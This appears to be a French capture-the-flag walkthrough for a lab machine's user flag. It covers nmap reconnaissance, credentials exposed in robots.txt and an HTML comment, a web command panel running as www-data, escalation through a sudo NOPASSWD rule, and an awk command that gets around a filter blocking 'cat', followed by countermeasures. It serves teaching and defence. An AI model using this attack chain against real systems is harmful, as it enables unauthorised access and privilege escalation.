---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-798 et CWE-269
---

# Documentation : H4ck3rz (User Flag)
# Documentation : H4ck3rz (User Flag)

## 1. Contexte & Objectif

> Prove that you are a h4ck3rz by hacking this 42sh!

* **Cible** : `10.10.0.50`
* **Objectif** : Explorer la machine et récupérer le fichier `user.txt`.

---

## 2. Reconnaissance avec Nmap

La première étape consiste à analyser les ports et les services de la machine cible :

```bash
nmap -sC -sV 10.10.0.50
```

### Signification des options

* `nmap` permet d'analyser les ports et services d'une machine.
* `-sC` lance les scripts NSE par défaut.
* `-sV` tente d'identifier la version des services.

### Résultat intéressant

```text
22/tcp open ssh
80/tcp open http Apache httpd 2.4.68
```

La machine expose donc un serveur SSH et un serveur HTTP.

---

## 3. Énumération de `robots.txt`

Nmap indique la présence d'une ressource interdite dans `robots.txt` :

```text
http-robots.txt:
Disallow: /1337_53CR37_l41r
```

La ressource est ensuite consultée directement :

```bash
curl http://10.10.0.50/1337_53CR37_l41r/
```

La page contient le mot de passe potentiel suivant :

```text
password to my super future 42sh: 8ES7_SHeLL_Ev4H
```

---

## 4. Analyse du HTML

La page principale contient le nom d'utilisateur dans un commentaire HTML :

```html
Remember username: d4rk_T1t0u4N
```

Les identifiants trouvés sont donc :

* **Username** : `d4rk_T1t0u4N`
* **Password** : `8ES7_SHeLL_Ev4H`

---

## 5. Tentative de connexion SSH

Une première tentative de connexion est effectuée avec ces identifiants :

```bash
ssh d4rk_T1t0u4N@10.10.0.50
```

L'authentification échoue. Une analyse plus détaillée est réalisée avec :

```bash
ssh -vvv d4rk_T1t0u4N@10.10.0.50
```

Le serveur accepte bien les méthodes `publickey,password`, mais le mot de passe fourni n'est pas accepté.

Cette étape montre qu'il ne faut pas supposer que des identifiants trouvés sont nécessairement destinés à SSH.

---

## 6. Découverte de `login.php`

Une nouvelle énumération HTTP est lancée :

```bash
nmap -p 80 --script http-enum 10.10.0.50
```

Cette commande permet de découvrir la page suivante :

```text
/login.php
```

### Pourquoi `http-enum` ?

`http-enum` est un script NSE qui recherche des ressources web courantes : pages, dossiers et fichiers potentiellement intéressants. Il permet d'aller au-delà du simple scan des ports.

---

## 7. Accès au shell panel

La page `login.php` permet d'obtenir un shell panel. Les commandes exécutées depuis ce panel sont lancées avec l'utilisateur `www-data`.

Vérification avec `whoami` :

```bash
whoami
```

Résultat :

```text
www-data
```

Puis vérification des privilèges avec `id` :

```bash
id
```

Résultat :

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nous sommes donc le processus du serveur web : `www-data`.

---

## 8. Énumération des privilèges sudo

Les privilèges sudo sont vérifiés avec la commande suivante :

```bash
sudo -l
```

Résultat :

```text
User www-data may run the following commands:
    (titouan) NOPASSWD: ALL
```

Cette règle signifie que `www-data` peut exécuter n'importe quelle commande en tant que `titouan`, sans mot de passe.

### Schéma de l'élévation de privilèges

```text
www-data
   |
   | sudo -u titouan
   v
titouan
```

Vérification :

```bash
sudo -u titouan whoami
sudo -u titouan id
```

Résultats :

```text
titouan
uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)
```

---

## 9. Recherche du `user.txt`

Le répertoire personnel de `titouan` est examiné :

```bash
sudo -u titouan bash -c 'echo $HOME'
```

Résultat :

```text
/home/titouan
```

Le contenu du répertoire est ensuite listé :

```bash
sudo -u titouan bash -c 'ls -la $HOME'
```

On découvre notamment :

```text
-rwsrwsrwt 1 root root 1298416 ... 42sh
-r-------- 1 titouan titouan 30 ... user.txt
```

Le fichier `user.txt` est lisible par `titouan`, mais pas par `www-data`.

Le shell panel bloque cependant le mot-clé `cat`. Une autre commande Unix peut être utilisée pour lire le fichier :

```bash
sudo -u titouan awk '{print}' /home/titouan/user.txt
```

Cette technique permet de récupérer le contenu de `user.txt`.

## 10 / Contre-mesures

### Secrets exposés dans `robots.txt` et le HTML

- Ne jamais utiliser `robots.txt`, des commentaires HTML ou une page cachée pour stocker un mot de passe.
- Retirer ces secrets du dépôt et faire une rotation s'ils ont été publiés.
- Protéger les ressources sensibles par une authentification réelle, pas par une URL difficile à deviner.

### Panel shell et privilèges sudo

- Supprimer les panels de commande en production ou les limiter à une liste d'actions métier allowlistées.
- Interdire `sudo -u utilisateur NOPASSWD: ALL` à un compte de service comme `www-data`.
- Pour une commande autorisée, utiliser un wrapper fixe qui valide les paramètres et ne permet pas de choisir une commande arbitraire.